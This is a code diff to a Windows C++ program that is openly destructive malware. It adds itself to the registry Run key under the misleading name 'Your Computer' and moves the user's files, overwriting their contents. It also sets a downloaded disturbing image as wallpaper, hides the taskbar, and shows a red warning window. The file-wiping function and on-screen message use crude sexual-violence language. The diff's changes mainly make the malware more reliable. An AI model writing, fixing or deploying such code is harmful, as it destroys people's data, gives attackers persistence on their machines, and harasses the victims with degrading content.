@@ -1,3 +1,6 @@
+#define UNICODE
+#define _UNICODE
+
 #include <windows.h>
 #include <shlobj.h>
 #include <string>
@@ -8,26 +11,29 @@
 #include <winreg.h>
 #include <commctrl.h>
 #include <urlmon.h>
-#include <tchar.h>
+#include <cwctype>
 #include <shellapi.h>
 #include <thread>
 #include <chrono>
 
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "shell32.lib")
 
 namespace fs = std::filesystem;
 
 const wchar_t* startup_name = L"Your Computer";
 
-HWND taskbar = FindWindowW(L"Shell_TrayWnd", nullptr);
+HWND taskbar = nullptr;
 
 void hide_taskbar() {
-    ShowWindow(taskbar, SW_HIDE);
+    if (taskbar)
+        ShowWindow(taskbar, SW_HIDE);
 }
 
 void show_taskbar() {
-    ShowWindow(taskbar, SW_SHOW);
+    if (taskbar)
+        ShowWindow(taskbar, SW_SHOW);
 }
 
 void add_to_startup() {
@@ -35,13 +41,15 @@ void add_to_startup() {
     const wchar_t* run_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
     wchar_t exe_path[MAX_PATH];
-    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
+    if (GetModuleFileNameW(nullptr, exe_path, MAX_PATH) == 0) {
+        std::wcerr << L"Failed to get module file name\n";
+        return;
+    }
 
     std::wstring cmd = L"\"";
     cmd += exe_path;
     cmd += L"\"";
 
-    // Open key for reading to check existing value
     if (RegOpenKeyExW(HKEY_CURRENT_USER, run_key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD size = 0;
         DWORD type = 0;
@@ -51,14 +59,13 @@ void add_to_startup() {
                 std::wstring existing_value(buffer.data());
                 if (existing_value == cmd) {
                     RegCloseKey(hKey);
-                    return; // Already set
+                    return;
                 }
             }
         }
         RegCloseKey(hKey);
     }
 
-    // Open key for writing
     if (RegOpenKeyExW(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExW(hKey, startup_name, 0, REG_SZ, reinterpret_cast<const BYTE*>(cmd.c_str()), static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
         RegCloseKey(hKey);
@@ -107,15 +114,12 @@ void move_and_rape_files() {
 
         fs::path dest_path = target_folder / file_path.filename();
 
-        // Move file
         std::error_code move_ec;
         fs::rename(file_path, dest_path, move_ec);
         if (move_ec) {
-            // Could be permission error or file exists, skip
             continue;
         }
 
-        // Overwrite file content
         std::wofstream ofs(dest_path, std::ios::out | std::ios::trunc);
         if (ofs.is_open()) {
             ofs << L"Raped this file.";
@@ -153,7 +157,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
-    // Change this URL to the image you want to use as wallpaper
+    taskbar = FindWindowW(L"Shell_TrayWnd", nullptr);
+
     std::wstring wallpaper_url = L"https://imgk.timesnownews.com/story/demonic_figure_on_google_earth.png?tr=w-400,h-300,fo-auto";
 
     wchar_t* home_path = nullptr;
@@ -170,18 +175,16 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
     add_to_startup();
     move_and_rape_files();
 
-    // Register window class
     const wchar_t CLASS_NAME[] = L"RapedFilesWindowClass";
 
     WNDCLASS wc = { };
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
     wc.lpszClassName = CLASS_NAME;
-    wc.hbrBackground = CreateSolidBrush(RGB(255, 0, 0)); // red background
+    wc.hbrBackground = CreateSolidBrush(RGB(255, 0, 0));
 
     RegisterClass(&wc);
 
-    // Calculate window size and position
     int window_width = 600;
     int window_height = 300;
 
@@ -207,7 +210,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
         return 1;
     }
 
-    // Create static text control for label
     HWND hwndLabel = CreateWindowW(
         L"STATIC",
         L"⚠️  WARNING!\nI raped your files, goodluck restoring them!.",
@@ -219,7 +221,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
         nullptr
     );
 
-    // Set font for label
     HFONT hFont = CreateFontW(
         20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
         DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
@@ -232,7 +233,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
 
     hide_taskbar();
 
-    // Message loop
     MSG msg = { };
     while (GetMessage(&msg, nullptr, 0, 0)) {
         TranslateMessage(&msg);
